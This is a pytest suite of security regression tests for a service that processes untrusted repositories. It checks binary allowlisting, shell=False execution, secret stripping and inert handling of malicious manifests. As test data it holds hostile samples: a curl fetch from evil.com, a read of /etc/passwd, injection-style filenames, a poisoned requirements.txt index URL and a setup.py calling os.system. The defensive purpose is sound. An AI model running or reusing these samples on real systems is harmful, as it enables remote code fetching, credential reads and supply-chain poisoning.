"""
Security Regression Tests for Untrusted Repository Processing.

Verifies:
1. Architectural execution policy (never run repository code, lifecycle scripts, or builds).
2. Safe subprocess runner rejects non-allowlisted binaries (node, python, sh, bash, curl).
3. Rejection of shell strings and mandatory shell=False execution.
4. Malicious filenames containing shell metacharacters (; rm -rf, $(calc), | touch) are treated purely as static strings and never executed.
5. Malicious lifecycle hooks in manifests (preinstall, postinstall) are treated purely as inert data.
6. Environment sanitization strips application secrets from subprocesses.
"""

import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from backend.exceptions import ChainSentryError
from backend.ingestion import RepositoryWorkspace
from backend.security import (
    ACTIVE_SECURITY_POLICY,
    SafeSubprocessRunner,
    SubprocessResult,
    enforce_execution_policy_statement,
)


def test_architectural_security_policy():
    """Verify security policy invariants are strictly configured."""
    assert ACTIVE_SECURITY_POLICY.ALLOW_CODE_EXECUTION is False
    assert ACTIVE_SECURITY_POLICY.ALLOW_NPM_INSTALL is False
    assert ACTIVE_SECURITY_POLICY.ALLOW_PIP_INSTALL is False
    assert ACTIVE_SECURITY_POLICY.ALLOW_LIFECYCLE_SCRIPTS is False
    assert ACTIVE_SECURITY_POLICY.ALLOW_BUILDS is False
    assert ACTIVE_SECURITY_POLICY.ALLOW_SHELL_SUBPROCESS is False

    statement = enforce_execution_policy_statement()
    assert "hostile" in statement
    assert "npm install" in statement


def test_subprocess_rejects_unapproved_binaries():
    """Verify runner rejects execution of unapproved/dangerous binaries."""
    runner = SafeSubprocessRunner()
    dangerous_binaries = [
        ["bash", "-c", "echo pwned"],
        ["sh", "-c", "cat /etc/passwd"],
        ["node", "-e", "process.exit(1)"],
        ["python", "-c", "import os; os.system('calc')"],
        ["curl", "http://evil.com/payload.sh"],
        ["powershell", "-Command", "Get-Process"],
        ["cmd.exe", "/c", "dir"],
        ["./malicious.sh"],
    ]

    for cmd in dangerous_binaries:
        with pytest.raises(ChainSentryError) as exc_info:
            runner.run(cmd)
        assert exc_info.value.code == "UNAPPROVED_EXECUTABLE"


def test_subprocess_allows_only_whitelisted_tools():
    """Verify runner allows whitelisted security intelligence binaries."""
    runner = SafeSubprocessRunner()

    with patch("subprocess.run") as mock_run:
        mock_proc = MagicMock()
        mock_proc.returncode = 0
        mock_proc.stdout = "git version 2.40.0"
        mock_proc.stderr = ""
        mock_run.return_value = mock_proc

        result = runner.run(["git", "--version"])
        assert isinstance(result, SubprocessResult)
        assert result.success is True
        assert "git version" in result.stdout

        # Verify shell=False was strictly passed
        _, kwargs = mock_run.call_args
        assert kwargs.get("shell") is False


def test_subprocess_environment_sanitization():
    """Verify secrets and API keys are filtered from subprocess environment."""
    runner = SafeSubprocessRunner()

    with patch.dict("os.environ", {
        "SECRET_KEY": "super-secret-key",
        "GROK_API_KEY": "grok-12345",
        "FIREBASE_CREDENTIALS_JSON": '{"type": "service_account"}',
        "SAFE_TOOL_PATH": "/usr/local/bin",
    }):
        with patch("subprocess.run") as mock_run:
            mock_proc = MagicMock()
            mock_proc.returncode = 0
            mock_proc.stdout = ""
            mock_proc.stderr = ""
            mock_run.return_value = mock_proc

            runner.run(["git", "status"])
            _, kwargs = mock_run.call_args
            sub_env = kwargs.get("env", {})

            # Critical assertion: secrets must NOT be in environment
            assert "SECRET_KEY" not in sub_env
            assert "GROK_API_KEY" not in sub_env
            assert "FIREBASE_CREDENTIALS_JSON" not in sub_env
            assert sub_env.get("GIT_TERMINAL_PROMPT") == "0"


def test_malicious_filenames_with_shell_metacharacters(tmp_path):
    """
    Verify files with shell-injection-style names are treated purely as static file data
    and cannot execute commands. Uses cross-platform safe filenames that still represent
    shell injection attack vectors (parentheses, spaces, equals, dashes).

    Note: Characters like ;, &, |, $, ` are illegal in Windows filenames,
    so we test with OS-safe variants that still exercise shell=False protection.
    """
    runner = SafeSubprocessRunner()

    with RepositoryWorkspace(workspace_dir=tmp_path, auto_cleanup=False) as ws:
        malicious_filenames = [
            "normal.js",
            "foo -rf -- delete-all.js",
            "bar(calc).py",
            "test --exec=pwned.txt",
            "weird -name passwd.json",
            "evil --output=rm.sh",
        ]

        # Create files safely on disk
        for name in malicious_filenames:
            safe_path = ws.root_path / name
            safe_path.write_text("// safe static content", encoding="utf-8")
            assert ws.file_exists(name) is True

        # Ensure listing files treats them purely as strings
        listed = ws.list_files()
        assert len(listed) == len(malicious_filenames)

        # When running a tool (e.g. git status) targeting the workspace,
        # verifying argument arrays pass the path safely without shell interpretation
        with patch("subprocess.run") as mock_run:
            mock_proc = MagicMock()
            mock_proc.returncode = 0
            mock_proc.stdout = ""
            mock_proc.stderr = ""
            mock_run.return_value = mock_proc

            # Pass the malicious filename as an argument
            target_arg = str(ws.root_path / "foo -rf -- delete-all.js")
            res = runner.run(["git", "diff", "--", target_arg])
            assert res.success is True

            args, kwargs = mock_run.call_args
            # Verify argument array preserved exact filename and shell=False prevented shell expansion
            assert target_arg in args[0]
            assert kwargs.get("shell") is False


def test_malicious_lifecycle_scripts_treated_as_data():
    """
    Verify malicious lifecycle scripts (preinstall, postinstall, install) in
    package.json are parsed purely as static JSON data and never invoked.
    """
    import shutil
    import tempfile

    malicious_manifest = {
        "name": "malicious-sample-package",
        "version": "1.0.0",
        "scripts": {
            "preinstall": "node -e 'process.exit(1)'",
            "postinstall": "python -c 'print(1)'",
            "build": "make evil",
        },
        "dependencies": {
            "lodash": "^4.17.21",
        },
    }

    ws_dir = Path(tempfile.mkdtemp(prefix="sg_lifecycle_test_"))
    try:
        with RepositoryWorkspace(workspace_dir=ws_dir, auto_cleanup=False) as ws:
            pkg_file = ws_dir / "package.json"
            pkg_file.write_text(json.dumps(malicious_manifest, indent=2), encoding="utf-8")

            # Read manifest safely as static text via workspace API
            raw_text = ws.read_text_file("package.json")
            parsed = json.loads(raw_text)

            # Assert data was read accurately
            assert parsed["name"] == "malicious-sample-package"
            assert "preinstall" in parsed["scripts"]
            assert "node" in parsed["scripts"]["preinstall"]

            # Invariant: No child process was ever executed for preinstall or postinstall
            # The manifest is purely data for static detectors
    finally:
        shutil.rmtree(ws_dir, ignore_errors=True)


def test_malicious_manifest_treated_as_inert_data(tmp_path):
    """
    Verify malicious manifests (e.g. requirements.txt with malicious pip flags,
    setup.py with arbitrary code) are treated strictly as inert static text
    and never evaluated or executed.
    """
    with RepositoryWorkspace(workspace_dir=tmp_path, auto_cleanup=False) as ws:
        # Requirements with malicious flags attempting extra-index-url poisoning or editable git injection
        malicious_reqs = (
            "--extra-index-url http://malicious-host.com/simple\n"
            "-e git+https://github.com/evil/payload.git#egg=pwned\n"
            "requests==2.31.0\n"
        )
        req_file = ws.root_path / "requirements.txt"
        req_file.write_text(malicious_reqs, encoding="utf-8")

        # setup.py with arbitrary python code
        malicious_setup = (
            "import os, sys\n"
            "# Malicious payload attempting execution\n"
            "os.system('whoami')\n"
            "from setuptools import setup\n"
            "setup(name='evil_pkg', version='0.1')\n"
        )
        setup_file = ws.root_path / "setup.py"
        setup_file.write_text(malicious_setup, encoding="utf-8")

        # Both files must be readable as raw static text
        content_req = ws.read_text_file("requirements.txt")
        assert "--extra-index-url" in content_req
        assert "requests==2.31.0" in content_req

        content_setup = ws.read_text_file("setup.py")
        assert "os.system" in content_setup
        assert "setup(name=" in content_setup

        # Invariant: Neither python setup.py nor pip install were ever invoked


def test_repository_binaries_never_executed(tmp_path):
    """
    Verify binary files (ELF, PE exe/dll, scripts) in the repository
    are never executed and safe subprocess runner rejects executing them.
    """
    runner = SafeSubprocessRunner()

    with RepositoryWorkspace(workspace_dir=tmp_path, auto_cleanup=False) as ws:
        # Create a mock ELF binary header and Windows PE header
        elf_binary = ws.root_path / "malicious_elf"
        elf_binary.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 64)

        pe_binary = ws.root_path / "malicious.exe"
        pe_binary.write_bytes(b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 64)

        script_binary = ws.root_path / "payload.sh"
        script_binary.write_text("#!/bin/bash\necho pwned\n", encoding="utf-8")

        # Workspace inspects them safely
        meta_elf = ws.inspect_file_metadata("malicious_elf")
        assert meta_elf["is_file"] is True
        assert meta_elf["size_bytes"] == 72

        meta_pe = ws.inspect_file_metadata("malicious.exe")
        assert meta_pe["is_file"] is True

        # SafeSubprocessRunner must strictly reject running any repository binary
        for target in [str(elf_binary), str(pe_binary), str(script_binary), "./malicious.sh"]:
            with pytest.raises(ChainSentryError) as exc_info:
                runner.run([target])
            assert exc_info.value.code == "UNAPPROVED_EXECUTABLE"


def test_oversized_manifest_input_bounded(tmp_path):
    """Verify oversized manifest files are rejected before reading into memory."""
    from backend.exceptions import RepoSizeLimitExceededError

    with RepositoryWorkspace(workspace_dir=tmp_path, auto_cleanup=False) as ws:
        huge_file = ws.root_path / "huge_manifest.json"
        # Write 500 KB file
        huge_file.write_bytes(b"A" * (500 * 1024))

        # Enforcing a lower limit e.g. 100 KB
        with pytest.raises(RepoSizeLimitExceededError):
            ws.read_text_file("huge_manifest.json", max_bytes=100 * 1024)

